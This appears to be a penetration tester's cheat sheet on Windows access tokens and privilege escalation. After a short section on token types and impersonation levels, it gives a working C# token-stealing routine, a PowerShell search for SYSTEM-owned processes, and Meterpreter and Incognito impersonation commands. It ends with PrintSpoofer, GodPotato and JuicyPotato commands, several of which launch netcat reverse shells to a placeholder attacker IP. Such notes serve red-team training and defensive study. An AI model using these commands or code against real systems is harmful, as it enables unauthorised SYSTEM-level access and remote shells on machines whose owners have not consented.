---
tags:
  - Credential_Access
  - Foundational
  - Privilege_Escalation
  - Token_Manipulation
  - Windows
---

## Access Token Theory
resources: [Microsoft Access Tokens](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)

> [!info] Access tokens represent security context of process/thread. Contain user SID, group SIDs, privileges. Can be stolen/impersonated for privilege escalation.

### Token Types
> - **Primary Token** - Assigned to process, represents process owner
> - **Impersonation Token** - Thread-level, allows acting as different user

### Impersonation Levels
> - **Anonymous** - Server cannot identify client
> - **Identification** - Server can identify but not impersonate
> - **Impersonation** - Server can impersonate locally
> - **Delegation** - Server can impersonate across network

### Required Privileges for Token Manipulation
> [!important] Key privileges:
> - **SeImpersonatePrivilege** - Impersonate tokens (service accounts have this)
> - **SeAssignPrimaryTokenPrivilege** - Assign tokens to processes
> - **SeDebugPrivilege** - Access other processes (for token theft)

### Check Current Privileges [Remote]
```cmd
whoami /priv
```

## Elevation with Impersonation

### Token Stealing with C#
```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

class TokenStealer
{
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hHandle);

    const uint TOKEN_ALL_ACCESS = 0xF01FF;

    static void StealToken(int pid)
    {
        IntPtr hToken;
        IntPtr hDupToken;

        Process proc = Process.GetProcessById(pid);
        OpenProcessToken(proc.Handle, TOKEN_ALL_ACCESS, out hToken);
        DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out hDupToken);
        ImpersonateLoggedOnUser(hDupToken);

        // Now running as stolen token's user
        Console.WriteLine(System.Security.Principal.WindowsIdentity.GetCurrent().Name);

        CloseHandle(hToken);
        CloseHandle(hDupToken);
    }
}
```

### Find High-Privilege Processes [Remote]
```powershell
Get-Process | ForEach-Object {
    try {
        $owner = (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").GetOwner()
        if ($owner.User -eq "SYSTEM") {
            [PSCustomObject]@{
                Name = $_.Name
                PID = $_.Id
                User = "$($owner.Domain)\$($owner.User)"
            }
        }
    } catch {}
}
```

## Incognito

### Meterpreter Incognito
```text
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "DOMAIN\\Administrator"
```

### Incognito Standalone [Remote]
```cmd
incognito.exe list_tokens -u
incognito.exe execute -c "DOMAIN\Administrator" cmd.exe
```

## Potato Attacks

### PrintSpoofer (SeImpersonatePrivilege) [Remote]
```cmd
PrintSpoofer.exe -i -c "cmd.exe"
PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe <AttackerIP> <Port> -e cmd.exe"
```

### GodPotato [Remote]
```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe <AttackerIP> <Port>"
```

### JuicyPotato (Windows 10 < 1809) [Remote]
```cmd
JuicyPotato.exe -l 9999 -p C:\Windows\Temp\nc.exe -a "<AttackerIP> <Port> -e cmd.exe" -t *
```
